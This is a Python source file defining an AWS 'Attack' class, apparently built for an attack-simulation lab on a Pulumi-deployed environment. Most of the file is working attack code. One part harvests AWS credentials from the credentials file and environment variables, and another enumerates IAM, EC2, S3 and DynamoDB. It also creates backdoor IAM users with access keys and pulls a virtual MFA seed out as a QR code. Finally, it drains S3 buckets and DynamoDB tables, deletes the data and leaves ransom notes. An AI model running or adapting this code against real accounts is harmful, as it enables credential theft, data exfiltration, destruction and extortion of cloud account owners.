import boto3
import json
import time
import subprocess
import base64
import os
import configparser



#### Referactor devopsuser hardcoding to be flexible in instanstiatign with any user input
#### for modulatity
class Attack:
    """Main Attack Class Integrating AWS MFA Setup and User Session Management"""

    def __init__(self, region="us-east-1"):
        """Initialize AWS Clients and Fetch Pulumi Outputs"""
        self.iam_client = boto3.client("iam", region_name=region)
        self.sts_client = boto3.client("sts", region_name=region)
        self.region = region
        self.pulumi_outputs = None  # Defer loading until needed
    

        #  Force Boto3 to use the correct credentials & config file locations
        os.environ["AWS_SHARED_CREDENTIALS_FILE"] = os.path.expanduser("~/.aws/credentials")
        os.environ["AWS_CONFIG_FILE"] = os.path.expanduser("~/.aws/config")

        # Verify if AWS Profile exists before proceeding
        session = boto3.Session()
        available_profiles = session.available_profiles  # List all profiles
        if "devopsuser" not in available_profiles:
            raise RuntimeError(f"ERROR: AWS Profile 'devopsuser' not found! Available profiles: {available_profiles}")

        print(f"AWS Profile 'devopsuser' found! Proceeding with Attack Initialization...")

        # Load Pulumi outputs BEFORE using them
        self.load_pulumi_outputs()

        self.devops_user = "DevopsUser"
        self.mfa_arn = self.pulumi_outputs.get("devops_user_mfa_arn")

        # ----------- #
        # Access Keys #
        # ----------- #
        self.access_key_id = self.pulumi_outputs.get("devops_access_key_id")
        self.secret_access_key = self.pulumi_outputs.get("devops_secret_access_key")

        # --------------------- #
        # Initialize Subclasses #
        # --------------------- #
        self.session_hijack = self.SessionHijack(self.devops_user, self.sts_client)


        # ------------------------------------- #
        # For Class Enumeration & User Creation #
        # ------------------------------------- #
        self.credentials_path = os.path.expanduser("~/.aws/credentials")
        #self.enumeration = self.Enumeration(self)
        self.aws_profile = "devopsuser"
        self.output_dir = "/workspaces/Pulumi/AWS_Enumeration"
        os.makedirs(self.output_dir, exist_ok=True)

        # Load credentials from ~/.aws/credentials instead of relying on the profile
        self.access_key, self.secret_key, self.session_token = self.load_credentials_from_file()

        # Manually initialize boto3 session with the loaded credentials
        self.session = boto3.Session(
            aws_access_key_id=self.access_key,
            aws_secret_access_key=self.secret_key,
            aws_session_token=self.session_token
        )
        # Locate DevOpsUser's credentials (from session token stored in AWS profile)
        #self.session = boto3.Session(profile_name=self.aws_profile)
        self.iam_client = self.session.client("iam")
        self.s3_client = self.session.client("s3")
        self.dynamodb_client = self.session.client("dynamodb")
        self.ec2_client = self.session.client("ec2")

        # Initialize Enumeration automatically using the inherited session
        self.enumeration = self.Enumeration(self)

        # Initialize AWS_CreateUser_AttachPolicies using the inherited session
        self.createuser_attatchpolicies = self.AWS_CreateUser_AttachPolicies(self)


    def load_pulumi_outputs(self):
           """🔍 Load Pulumi outputs only when needed"""
           if self.pulumi_outputs is not None:
               return  # Already loaded
    
           pulumi_output_path = "/workspaces/Pulumi/Infra/forrester-2025-output.json"
    
           if not os.path.exists(pulumi_output_path):
               raise RuntimeError(f"ERROR: Pulumi output file '{pulumi_output_path}' not found. Did you run 'pulumi up'?")
    
           try:
               with open(pulumi_output_path, "r") as file:
                   self.pulumi_outputs = json.load(file)
    
               if not isinstance(self.pulumi_outputs, dict):
                   raise RuntimeError("ERROR: Pulumi output file is corrupted or not in JSON format.")
    
           except json.JSONDecodeError:
               raise RuntimeError(f"ERROR: Pulumi output file '{pulumi_output_path}' contains invalid JSON. Check Pulumi execution.")
    
           except Exception as e:
               raise RuntimeError(f"ERROR: Failed to load Pulumi outputs: {str(e)}")



    def get_pulumi_output(self, key):
        """🔍 Retrieve a specific value from Pulumi outputs"""
        if self.pulumi_outputs is None:
            self.load_pulumi_outputs()

        return self.pulumi_outputs.get(key, f"ERROR: {key} not found in Pulumi outputs.")


    def load_credentials_from_file(self):
        """🔍 Reads AWS credentials manually from ~/.aws/credentials"""
        config = configparser.ConfigParser()
        config.read(self.credentials_path)

        if self.aws_profile not in config:
            print(f"ERROR: Profile '{self.aws_profile}' not found in {self.credentials_path}.")
            exit(1)

        access_key = config[self.aws_profile].get("aws_access_key_id")
        secret_key = config[self.aws_profile].get("aws_secret_access_key")
        session_token = config[self.aws_profile].get("aws_session_token")

        if not all([access_key, secret_key, session_token]):
            print(f"ERROR: Missing credentials for '{self.aws_profile}'. Ensure you have a valid session token.")
            exit(1)

        print(f"Loaded credentials from {self.credentials_path}: AccessKey={access_key[:5]}... SessionToken={session_token[:10]}...")
        return access_key, secret_key, session_token


    class Enumeration:
        """🔍 Handles Enumeration of AWS Resources"""

        def __init__(self, attack_instance):      
            """Use DevOpsUser's AWS session"""
            self.session = attack_instance.session
            self.iam_client = self.session.client("iam")
            self.s3_client = self.session.client("s3")
            self.dynamodb_client = self.session.client("dynamodb")
            self.ec2_client = self.session.client("ec2")
            self.output_dir = "/workspaces/Pulumi/AWS_Enumeration"

            os.makedirs(self.output_dir, exist_ok=True)

        def enumerate_users(self):
            """Enumerates all IAM users"""
            print("Enumerating IAM users...")
            response = self.iam_client.list_users()
            self.save_results("iam_users.json", response)

        def enumerate_ec2(self):
            """Enumerates all EC2 instances"""
            print("Enumerating EC2 instances...")
            response = self.ec2_client.describe_instances()
            self.save_results("ec2_instances.json", response)

        def enumerate_policies(self):
            """Enumerates all IAM policies"""
            print("Enumerating IAM policies...")
            response = self.iam_client.list_policies(Scope="Local")
            self.save_results("iam_policies.json", response)

        def enumerate_s3(self):
            """Enumerates all S3 buckets"""
            print("Enumerating S3 buckets...")
            response = self.s3_client.list_buckets()
            self.save_results("s3_buckets.json", response)

        def enumerate_dynamodb(self):
            """Enumerates all DynamoDB tables"""
            print("Enumerating DynamoDB tables...")
            response = self.dynamodb_client.list_tables()
            self.save_results("dynamodb_tables.json", response)

        def save_results(self, filename, data):
           """Saves enumeration results to a file with proper serialization"""
           filepath = os.path.join(self.output_dir, filename)
           try:
               with open(filepath, "w") as f:
                   json.dump(data, f, indent=4, default=str)  # 🔥 Convert non-serializable types to string
               print(f"Saved results to {filepath}")
           except Exception as e:
               print(f"ERROR: Failed to save {filename}: {e}")

        def run_all_enumerations(self):
            """Runs all enumeration functions"""
            self.enumerate_users()
            self.enumerate_ec2()
            self.enumerate_policies()
            self.enumerate_s3()
            self.enumerate_dynamodb()
            print("Enumeration Complete! Results saved.")





    class AWS_CreateUser_AttachPolicies:
        def __init__(self, attack_instance):
            """Initialize with an authenticated session"""
            """Use DevOpsUser's AWS session"""
            self.session = attack_instance.session
            self.iam_client = self.session.client('iam')

        def create_user(self, username):
            """Creates an IAM user"""
            try:
                response = self.iam_client.create_user(UserName=username)
                print(f"User {username} created successfully.")
                return response['User']
            except Exception as e:
                print(f"Error creating user: {e}")
                return None

        def create_access_keys(self, username):
            """Creates access keys for the IAM user"""
            try:
                response = self.iam_client.create_access_key(UserName=username)
                print(f"Access keys created for {username}.")
                return response['AccessKey']
            except Exception as e:
                print(f"Error creating access keys: {e}")
                return None

        def attach_policies(self, username, policy_arns):
            """Attaches policies to the IAM user"""
            for policy_arn in policy_arns:
                try:
                    self.iam_client.attach_user_policy(UserName=username, PolicyArn=policy_arn)
                    print(f"Attached policy {policy_arn} to {username}.")
                except Exception as e:
                    print(f"Error attaching policy {policy_arn}: {e}")

        def run_pipeline(self, username, policy_arns):
            """Executes the full pipeline: create user, attach policies, then create access keys"""
            user = self.create_user(username)
            if user:
                self.attach_policies(username, policy_arns)
                access_keys = self.create_access_keys(username)
                return access_keys  # Returning access keys if needed for further processing
            return None



    class S3_Drain_Delete:
        def __init__(self, session, target_s3_arns):
            """Initialize S3 client and target S3 buckets"""
            self.s3_client = session.client('s3')
            self.target_buckets = [arn.split(":")[-1] for arn in target_s3_arns]  # Extract bucket names from ARNs

        def search_and_exfiltrate(self, exfiltration_path="./s3_Exfiltration"):
            """Downloads all objects from targeted buckets, deletes them, and leaves a ransom note"""
            os.makedirs(exfiltration_path, exist_ok=True)

            for bucket in self.target_buckets:
                objects = self.s3_client.list_objects_v2(Bucket=bucket).get('Contents', [])
                for obj in objects:
                    key = obj['Key']
                    file_path = os.path.join(exfiltration_path, f"{bucket}_{key.replace('/', '_')}.json")

                    # Download full object
                    self.s3_client.download_file(bucket, key, file_path)
                    print(f"Downloaded: {key} from {bucket}")

                    # Delete the object from S3
                    self.s3_client.delete_object(Bucket=bucket, Key=key)
                    print(f"Deleted: {key} from {bucket}")

                # Leave ransom note in each bucket
                ransom_note = "Your data has been taken. Pay or it’s gone forever."
                self.s3_client.put_object(Bucket=bucket, Key="too_late.txt", Body=ransom_note)
                print(f"Ransom note placed in {bucket}")


    class DynamoDB_Drain_Delete:
        def __init__(self, session, target_dynamodb_arns):
            """Initialize DynamoDB client and target tables"""
            self.dynamodb_client = session.client('dynamodb')
            self.dynamodb_resource = session.resource('dynamodb')
            self.target_tables = [arn.split("/")[-1] for arn in target_dynamodb_arns]  # Extract table names from ARNs

        def search_and_exfiltrate(self, exfiltration_path="./DynamoDB_Exfiltration"):
            """Downloads all content from targeted tables, deletes them, and leaves a ransom note"""
            os.makedirs(exfiltration_path, exist_ok=True)

            for table_name in self.target_tables:
                table = self.dynamodb_resource.Table(table_name)
                scan_response = table.scan()
                data = scan_response.get('Items', [])

                if data:
                    file_path = os.path.join(exfiltration_path, f"{table_name}.json")
                    with open(file_path, 'w') as f:
                        json.dump(data, f, indent=4)
                    print(f"Extracted data from {table_name} to {file_path}")

                # Delete the entire table
                self.dynamodb_client.delete_table(TableName=table_name)
                print(f"Deleted table {table_name}")

                # Leave ransom note in exfiltrated directory
                ransom_note = {"Message": "Your database is gone. Pay to get it back."}
                note_path = os.path.join(exfiltration_path, f"{table_name}_RANSOM_NOTE.json")
                with open(note_path, 'w') as f:
                    json.dump(ransom_note, f, indent=4)
                print(f"Ransom note left in {exfiltration_path} for {table_name}")


    # # Example Usage
    # if __name__ == "__main__":
    #     # Assuming the session is established using STS
    #     session = boto3.Session(
    #         aws_access_key_id="YOUR_SESSION_ACCESS_KEY",
    #         aws_secret_access_key="YOUR_SESSION_SECRET_KEY",
    #         aws_session_token="YOUR_SESSION_TOKEN",
    #         region_name="us-east-1"
    #     )

    #     # Target specific pre-selected S3 bucket ARNs
    #     target_s3_arns = [
    #         "arn:aws:s3:::sensitive-data-backups",
    #         "arn:aws:s3:::company-private-storage"
    #     ]

    #     # Target specific pre-selected DynamoDB table ARNs
    #     target_dynamodb_arns = [
    #         "arn:aws:dynamodb:us-east-1:123456789012:table/UserRecords",
    #         "arn:aws:dynamodb:us-east-1:123456789012:table/FinancialTransactions"
    #     ]

    #     # Run S3 Draining
    #     s3_attacker = S3_Drain_Delete(session, target_s3_arns)
    #     s3_attacker.search_and_exfiltrate()

    #     # Run DynamoDB Draining
    #     dynamo_attacker = DynamoDB_Drain_Delete(session, target_dynamodb_arns)
    #     dynamo_attacker.search_and_exfiltrate()




    class MFA_QR_Hijack:
        """🎭 Simulates MFA QR Code Hijack Attack"""

        def __init__(self, user, mfa_arn, iam_client):
            self.user = user
            self.mfa_arn = mfa_arn
            self.iam_client = iam_client
            self.mfa_secret = None

        def generate_qr_code(self):
            """📸 Generate a QR code from an already configured MFA device"""
            print(f"\n🚨 Hijacking QR Code for `{self.user}`...")

            # Fetch MFA Secret
            result = subprocess.run(
                f"aws iam get-virtual-mfa-device --serial-number {self.mfa_arn} --query 'VirtualMFADevice.Base32StringSeed' --output text",
                shell=True, capture_output=True, text=True
            )
            raw_secret = result.stdout.strip()
            
            if not raw_secret:
                print("❌ ERROR: MFA Secret not found. Possible security controls in place.")
                return

            self.mfa_secret = base64.b32encode(base64.b64decode(raw_secret)).decode().strip()

            otp_auth_uri = f"otpauth://totp/AWS:{self.user}?secret={self.mfa_secret}&issuer=AWS"
            qr = pyqrcode.create(otp_auth_uri)
            print("\n📲 Scan this QR Code in your authenticator app:\n")
            print(qr.terminal(quiet_zone=1))





    class SessionHijack:
        """⚠️ Hijack AWS Session for DevOpsUser"""

        def __init__(self, user, sts_client):
            """Initialize attack simulation for DevOpsUser"""
            self.iam_client = boto3.client("iam")
            self.sts_client = sts_client
            self.devops_user = user
            self.hijacked_creds = None

        def extract_credentials(self):
            """🔍 Extracts credentials from environment variables and AWS credentials file."""
            print("\n🔍 Searching for active AWS session tokens...")

            # Check environment variables
            env_vars = {var: os.getenv(var) for var in [
                "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN"
            ]}

            if env_vars["AWS_SESSION_TOKEN"]:
                print("✅ Found active AWS session token in environment variables!")
                self.hijacked_creds = env_vars
                return

            # Check credentials file
            creds_file = os.path.expanduser("~/.aws/credentials")
            if os.path.exists(creds_file):
                with open(creds_file, "r") as file:
                    lines = file.readlines()
                    profile = None
                    creds = {}
                    for line in lines:
                        if line.startswith("[") and "devops" in line.lower():
                            profile = line.strip()
                        elif profile and "=" in line:
                            key, value = line.strip().split("=", 1)
                            creds[key.strip()] = value.strip()

                    if creds:
                        print(f"✅ Found credentials for {self.devops_user} in AWS credentials file!")
                        self.hijacked_creds = creds
                        return

            print("❌ No AWS session tokens found. Attack cannot proceed.")

        def assume_devops_identity(self):
            """🛑 Assume DevOpsUser identity using stolen session tokens."""
            if not self.hijacked_creds:
                print("❌ No valid credentials available for DevOpsUser!")
                return

            print("\n🚀 Assuming DevOpsUser session...")
            os.environ.update({
                "AWS_ACCESS_KEY_ID": self.hijacked_creds["AWS_ACCESS_KEY_ID"],
                "AWS_SECRET_ACCESS_KEY": self.hijacked_creds["AWS_SECRET_ACCESS_KEY"],
                "AWS_SESSION_TOKEN": self.hijacked_creds.get("AWS_SESSION_TOKEN", "")
            })

            # Verify identity
            identity = subprocess.run("aws sts get-caller-identity", shell=True, capture_output=True, text=True).stdout
            print(f"\n🔍 Confirmed Identity:\n{identity}")

        def enumerate_test(self):
            """⚡ Perform simulated attack actions as DevOpsUser."""
            if not self.hijacked_creds:
                print("❌ No valid credentials available for DevOpsUser!")
                return

            print("\n🔥 Executing attack simulation as DevOpsUser...")

            attack_commands = [
                "aws iam list-users",
                "aws s3 ls",
                "aws sts get-caller-identity"
            ]

            for cmd in attack_commands:
                print(f"\n🚀 Running: {cmd}")
                output = subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout
                print(output)





